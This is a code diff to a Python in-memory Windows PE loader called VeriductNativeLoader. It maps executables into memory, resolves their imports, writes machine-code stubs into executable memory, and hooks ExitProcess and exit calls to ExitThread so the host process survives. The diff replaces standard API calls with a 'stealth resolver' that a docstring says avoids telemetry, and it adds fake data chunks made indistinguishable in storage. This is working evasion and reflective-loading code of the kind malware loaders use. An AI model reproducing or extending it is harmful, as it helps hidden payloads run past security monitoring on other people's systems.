+        argv_hook_int = argv_hook if isinstance(argv_hook, int) else ctypes.cast(argv_hook, ctypes.c_void_p).value if argv_hook else 0
         
-        if argv_hook:
-            ctypes.memmove(argv_hook, argv_stub, len(argv_stub))
-            logging.info(f"Created __p___argv hook at 0x{argv_hook:X}")
+        if argc_hook_int:
+            ctypes.memmove(argc_hook_int, argc_stub, len(argc_stub))
+            logging.info(f"Created __p___argc hook at 0x{argc_hook_int:X}")
         
-        return argc_hook, argv_hook
+        if argv_hook_int:
+            ctypes.memmove(argv_hook_int, argv_stub, len(argv_stub))
+            logging.info(f"Created __p___argv hook at 0x{argv_hook_int:X}")
+        
+        return argc_hook_int, argv_hook_int
 
     def _create_exit_hook(self):
         """Create a hook stub for exit() that calls _cexit() then ExitThread.
@@ -1137,37 +1465,43 @@ class VeriductNativeLoader:
             mov rax, <ExitThread>   ; Load ExitThread address
             jmp rax                 ; Jump to ExitThread
         """
-        kernel32 = ctypes.windll.kernel32
-        
-        # Ensure proper return types for 64-bit pointers
-        kernel32.GetProcAddress.restype = ctypes.c_void_p
-        kernel32.GetModuleHandleA.restype = ctypes.c_void_p
-        kernel32.VirtualAlloc.restype = ctypes.c_void_p
+        resolver = get_stealth_resolver()
         
         MEM_COMMIT = 0x1000
         MEM_RESERVE = 0x2000
-        PAGE_EXECUTE_READWRITE = 0x40
+        PAGE_EXECUTE_READWRITE_LOCAL = 0x40
         
-        # Get ExitThread address from kernel32
-        k32_handle = kernel32.GetModuleHandleA(b'kernel32.dll')
-        exit_thread_addr = kernel32.GetProcAddress(k32_handle, b'ExitThread')
+        # Get ExitThread address via stealth resolver
+        exit_thread_addr = resolver.get_proc_address("kernel32.dll", "ExitThread")
         
         if not exit_thread_addr:
             logging.error("Failed to get ExitThread address")
             return None
         
-        # Get _cexit address from ucrtbase.dll
-        try:
-            ucrt = ctypes.CDLL("ucrtbase.dll")
-            cexit_addr = kernel32.GetProcAddress(ucrt._handle, b"_cexit")
-        except:
+        # Get VirtualAlloc for allocating our stub
+        VirtualAlloc_addr = resolver.get_proc_address("kernel32.dll", "VirtualAlloc")
+        if not VirtualAlloc_addr:
+            logging.error("Failed to resolve VirtualAlloc for exit hook")
+            return None
+        
+        VirtualAlloc = ctypes.WINFUNCTYPE(
+            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong
+        )(VirtualAlloc_addr)
+        
+        # Get _cexit address - need to load ucrtbase first
+        cexit_addr = None
+        ucrt_base = resolver.load_library("ucrtbase.dll")
+        if ucrt_base:
+            cexit_addr = resolver.get_proc_address("ucrtbase.dll", "_cexit")
+        
+        if not cexit_addr:
             # Try api-ms-win-crt-runtime
-            try:
-                ucrt = ctypes.CDLL("api-ms-win-crt-runtime-l1-1-0.dll")
-                cexit_addr = kernel32.GetProcAddress(ucrt._handle, b"_cexit")
-            except:
-                logging.warning("Could not find _cexit, falling back to direct ExitThread")
-                cexit_addr = None
+            ucrt_base = resolver.load_library("api-ms-win-crt-runtime-l1-1-0.dll")
+            if ucrt_base:
+                cexit_addr = resolver.get_proc_address("api-ms-win-crt-runtime-l1-1-0.dll", "_cexit")
+        
+        if not cexit_addr:
+            logging.warning("Could not find _cexit, falling back to direct ExitThread")
         
         if cexit_addr:
             # Safe exit stub: _cexit() then ExitThread()
@@ -1187,28 +1521,37 @@ class VeriductNativeLoader:
             logging.warning(f"Created fallback exit hook -> ExitThread(0x{exit_thread_addr:X})")
         
         # Allocate executable memory for the stub
-        stub_addr = kernel32.VirtualAlloc(
-            None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
-        )
+        stub_addr = VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE_LOCAL)
         
         if stub_addr:
-            ctypes.memmove(stub_addr, shellcode, len(shellcode))
-            logging.info(f"Exit hook stub at 0x{stub_addr:X}")
-            return stub_addr
+            stub_addr_int = stub_addr if isinstance(stub_addr, int) else ctypes.cast(stub_addr, ctypes.c_void_p).value
+            ctypes.memmove(stub_addr_int, shellcode, len(shellcode))
+            logging.info(f"Exit hook stub at 0x{stub_addr_int:X}")
+            return stub_addr_int
         
         logging.error("Failed to allocate memory for exit hook")
         return None
 
     def _resolve_pe_imports(self, base_addr, import_rva):
-        """Walks Import Descriptor, loads DLLs, fills IAT."""
-        kernel32 = ctypes.windll.kernel32
+        """
+        Walks Import Descriptor, loads DLLs, fills IAT.
+        Uses StealthResolver to avoid ctypes.windll telemetry.
+        """
+        resolver = get_stealth_resolver()
         
-        # Set up GetProcAddress with proper signature
-        kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
-        kernel32.GetProcAddress.restype = ctypes.c_void_p
+        # Get function addresses we need through stealth resolution
+        LoadLibraryA_addr = resolver.get_proc_address("kernel32.dll", "LoadLibraryA")
+        GetProcAddress_addr = resolver.get_proc_address("kernel32.dll", "GetProcAddress")
         
-        kernel32.LoadLibraryA.argtypes = [ctypes.c_char_p]
-        kernel32.LoadLibraryA.restype = ctypes.c_void_p
+        if not LoadLibraryA_addr or not GetProcAddress_addr:
+            logging.error("Failed to resolve LoadLibraryA/GetProcAddress via stealth resolver")
+            return
+        
+        # Create callable function pointers using WINFUNCTYPE for Windows API calling convention
+        LoadLibraryA = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_char_p)(LoadLibraryA_addr)
+        GetProcAddress_by_name = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p)(GetProcAddress_addr)
+        # For ordinal, use c_void_p to ensure pointer-sized argument (ordinal passed as low bits)
+        GetProcAddress_by_ord = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)(GetProcAddress_addr)
         
         # Set up argv hooks if we have a custom command line
         argc_hook = None
@@ -1232,14 +1575,15 @@ class VeriductNativeLoader:
                 
             # Get DLL Name
             dll_name = ctypes.string_at(base_addr + name_rva).decode('ascii')
-            h_module = kernel32.LoadLibraryA(dll_name.encode('ascii'))
+            h_module = LoadLibraryA(dll_name.encode('ascii'))
             if not h_module:
                 logging.warning(f"Failed to load dependency: {dll_name}")
                 desc_ptr += 20
                 continue
             
+            h_module_int = h_module if isinstance(h_module, int) else ctypes.cast(h_module, ctypes.c_void_p).value
             dll_count += 1
-            logging.debug(f"Loaded DLL: {dll_name}")
+            logging.debug(f"Loaded DLL: {dll_name} at 0x{h_module_int:X}")
                 
             # Walk Thunks
             thunk_ptr = base_addr + (original_first_thunk if original_first_thunk else first_thunk)
@@ -1261,17 +1605,10 @@ class VeriductNativeLoader:
                 
                 if thunk_data & msb_mask:
                     # Import by ordinal
-                    # Windows ordinals: low word is ordinal, high word must be 0
-                    # Pass ordinal directly as integer (not pointer)
                     ordinal = thunk_data & 0xFFFF
-                    # For ordinals, the second parameter should be ordinal value directly
-                    # We need to bypass the c_char_p type checking
-                    kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
-                    proc_addr = kernel32.GetProcAddress(h_module, ordinal)
-                    # Reset to normal for name-based imports
-                    kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
+                    proc_addr = GetProcAddress_by_ord(h_module_int, ordinal)
                 else:
-                    # Import by name - GetProcAddress takes c_char_p
+                    # Import by name
                     name_ptr = base_addr + (thunk_data & 0x7FFFFFFF) + 2
                     func_name_bytes = ctypes.string_at(name_ptr)
                     dll_lower = dll_name.lower()
@@ -1279,7 +1616,7 @@ class VeriductNativeLoader:
                     # IAT HOOK: Swap ExitProcess -> ExitThread to keep host process alive
                     if dll_lower == 'kernel32.dll' and func_name_bytes == b'ExitProcess':
                         logging.debug("IAT Hook: Redirecting ExitProcess -> ExitThread")
-                        proc_addr = kernel32.GetProcAddress(h_module, b'ExitThread')
+                        proc_addr = GetProcAddress_by_name(h_module_int, b'ExitThread')
                     
                     # IAT HOOK: exit/_exit/quick_exit -> ExitThread (prevent CRT cleanup)
                     elif func_name_bytes in (b'exit', b'_exit', b'quick_exit', b'_Exit') and exit_hook:
@@ -1297,14 +1634,14 @@ class VeriductNativeLoader:
                         proc_addr = argv_hook
                     
                     else:
-                        # Pass as bytes directly (c_char_p)
-                        proc_addr = kernel32.GetProcAddress(h_module, func_name_bytes)
+                        proc_addr = GetProcAddress_by_name(h_module_int, func_name_bytes)
                 
                 if proc_addr:
+                    proc_addr_int = proc_addr if isinstance(proc_addr, int) else ctypes.cast(proc_addr, ctypes.c_void_p).value
                     if is_64:
-                        ctypes.memmove(iat_ptr, struct.pack('<Q', proc_addr), 8)
+                        ctypes.memmove(iat_ptr, struct.pack('<Q', proc_addr_int), 8)
                     else:
-                        ctypes.memmove(iat_ptr, struct.pack('<I', proc_addr), 4)
+                        ctypes.memmove(iat_ptr, struct.pack('<I', proc_addr_int), 4)
                     import_count += 1
                 else:
                     # Log failed import resolution
@@ -1324,7 +1661,7 @@ class VeriductNativeLoader:
             logging.debug(f"  Resolved {import_count} imports from {dll_name}")
             desc_ptr += 20
         
-        logging.info(f"Loaded {dll_count} DLLs")
+        logging.info(f"Loaded {dll_count} DLLs via stealth resolver")
 
     def _execute_tls_callbacks(self, base_addr):
         """Finds and executes Thread Local Storage callbacks."""
@@ -1355,7 +1692,7 @@ class VeriductNativeLoader:
         current_callback_ptr = base_addr + callbacks_rva
         
         # Setup Function Prototype: void PASCAL TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved)
-        TLS_FUNC = ctypes.CFUNCTYPE(None, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p)
+        TLS_FUNC = ctypes.WINFUNCTYPE(None, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p)
         
         try:
             while True:
@@ -1408,11 +1745,21 @@ class VeriductNativeLoader:
         entry_count = exception_size // 12
         table_ptr = base_addr + exception_rva
         
-        kernel32 = ctypes.windll.kernel32
+        resolver = get_stealth_resolver()
         
         try:
-            if hasattr(kernel32, 'RtlAddFunctionTable'):
-                result = kernel32.RtlAddFunctionTable(
+            # RtlAddFunctionTable is in ntdll on modern Windows
+            RtlAddFunctionTable_addr = resolver.get_proc_address("kernel32.dll", "RtlAddFunctionTable")
+            if not RtlAddFunctionTable_addr:
+                RtlAddFunctionTable_addr = resolver.get_proc_address("ntdll.dll", "RtlAddFunctionTable")
+            
+            if RtlAddFunctionTable_addr:
+                # BOOL return type is c_int (4 bytes), not c_bool (1 byte)
+                RtlAddFunctionTable = ctypes.WINFUNCTYPE(
+                    ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_uint64
+                )(RtlAddFunctionTable_addr)
+                
+                result = RtlAddFunctionTable(
                     ctypes.c_void_p(table_ptr),
                     ctypes.c_ulong(entry_count),
                     ctypes.c_uint64(base_addr)
@@ -1440,7 +1787,20 @@ class VeriductNativeLoader:
             return
 
         logging.info("Resolving Delay-Load Imports...")
-        kernel32 = ctypes.windll.kernel32
+        resolver = get_stealth_resolver()
+        
+        LoadLibraryA_addr = resolver.get_proc_address("kernel32.dll", "LoadLibraryA")
+        GetProcAddress_addr = resolver.get_proc_address("kernel32.dll", "GetProcAddress")
+        
+        if not LoadLibraryA_addr or not GetProcAddress_addr:
+            logging.warning("Failed to resolve LoadLibraryA/GetProcAddress for delay imports")
+            return
+        
+        # Use WINFUNCTYPE for Windows API calling convention
+        LoadLibraryA = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_char_p)(LoadLibraryA_addr)
+        GetProcAddress_by_name = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p)(GetProcAddress_addr)
+        # For ordinal, use c_void_p to ensure pointer-sized argument
+        GetProcAddress_by_ord = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)(GetProcAddress_addr)
         
         current_desc_ptr = base_addr + delay_rva
         
@@ -1455,24 +1815,23 @@ class VeriductNativeLoader:
             dll_name = ctypes.string_at(base_addr + name_rva).decode('ascii')
             
             # Load the DLL
-            h_module = kernel32.LoadLibraryA(dll_name.encode('ascii'))
+            h_module = LoadLibraryA(dll_name.encode('ascii'))
             if not h_module:
                 logging.warning(f"Failed to delay-load: {dll_name}")
                 current_desc_ptr += 32
                 continue
             
+            h_module_int = h_module if isinstance(h_module, int) else ctypes.cast(h_module, ctypes.c_void_p).value
             logging.debug(f"Delay-loaded DLL: {dll_name}")
                 
             # Write the Module Handle back
             module_handle_rva = struct.unpack('<I', ctypes.string_at(current_desc_ptr + 8, 4))[0]
             if module_handle_rva:
                 h_ptr = base_addr + module_handle_rva
-                # Convert h_module to proper unsigned value
-                h_module_val = h_module if h_module >= 0 else (h_module & 0xFFFFFFFFFFFFFFFF)
                 if is_64:
-                    ctypes.memmove(h_ptr, struct.pack('<Q', h_module_val), 8)
+                    ctypes.memmove(h_ptr, struct.pack('<Q', h_module_int), 8)
                 else:
-                    ctypes.memmove(h_ptr, struct.pack('<I', h_module_val & 0xFFFFFFFF), 4)
+                    ctypes.memmove(h_ptr, struct.pack('<I', h_module_int & 0xFFFFFFFF), 4)
 
             # Resolve the functions (IAT)
             iat_rva = struct.unpack('<I', ctypes.string_at(current_desc_ptr + 12, 4))[0]
@@ -1497,17 +1856,18 @@ class VeriductNativeLoader:
                 
                 if is_ordinal:
                     ordinal = name_ptr_val & 0xFFFF
-                    proc_addr = kernel32.GetProcAddress(h_module, ordinal)
+                    proc_addr = GetProcAddress_by_ord(h_module_int, ordinal)
                 else:
                     fn_name_ptr = base_addr + (name_ptr_val & 0xFFFFFFFF) + 2  # Skip Hint
                     fn_name = ctypes.string_at(fn_name_ptr)
-                    proc_addr = kernel32.GetProcAddress(h_module, fn_name)
+                    proc_addr = GetProcAddress_by_name(h_module_int, fn_name)
                 
                 if proc_addr:
+                    proc_addr_int = proc_addr if isinstance(proc_addr, int) else ctypes.cast(proc_addr, ctypes.c_void_p).value
                     if is_64:
-                        ctypes.memmove(iat_ptr, struct.pack('<Q', proc_addr), 8)
+                        ctypes.memmove(iat_ptr, struct.pack('<Q', proc_addr_int), 8)
                     else:
-                        ctypes.memmove(iat_ptr, struct.pack('<I', proc_addr), 4)
+                        ctypes.memmove(iat_ptr, struct.pack('<I', proc_addr_int), 4)
 
                 iat_ptr += ptr_size
                 int_ptr += ptr_size
@@ -1848,11 +2208,18 @@ class VeriductNativeLoader:
         logging.info("Cleaning up mapped memory...")
         if self.architecture == "PE":
             try:
-                ctypes.windll.kernel32.VirtualFree(
-                    ctypes.c_void_p(self.mapped_memory), 
-                    0, 
-                    0x8000  # MEM_RELEASE
-                )
+                resolver = get_stealth_resolver()
+                VirtualFree_addr = resolver.get_proc_address("kernel32.dll", "VirtualFree")
+                if VirtualFree_addr:
+                    # BOOL is c_int (4 bytes), not c_bool
+                    VirtualFree = ctypes.WINFUNCTYPE(
+                        ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong
+                    )(VirtualFree_addr)
+                    VirtualFree(
+                        ctypes.c_void_p(self.mapped_memory), 
+                        0, 
+                        0x8000  # MEM_RELEASE
+                    )
             except Exception as e:
                 logging.debug(f"Cleanup error: {e}")
         elif self.architecture == "ELF":
@@ -2166,7 +2533,7 @@ def annihilate_path(
                 # Hash and store chunks
                 for c in entangled:
                     h = calculate_salted_chunk_hash(file_salt, c)
-                    chunks_batch.append((h, c, False))
+                    chunks_batch.append((h, c))
                     key_sequence.append(h)
                     usf_hasher.update(c)
 
@@ -2174,6 +2541,7 @@ def annihilate_path(
                 chunk_storage.store_chunks_batch(chunks_batch)
 
                 # Generate and store fake chunks if enabled
+                # Fakes use derived salt - indistinguishable in DB, but hashes never in keymap
                 if use_fake_chunks:
                     fakes = generate_fake_chunks(len(chunks_batch), file_salt, fake_ratio)
                     chunk_storage.store_chunks_batch(fakes)
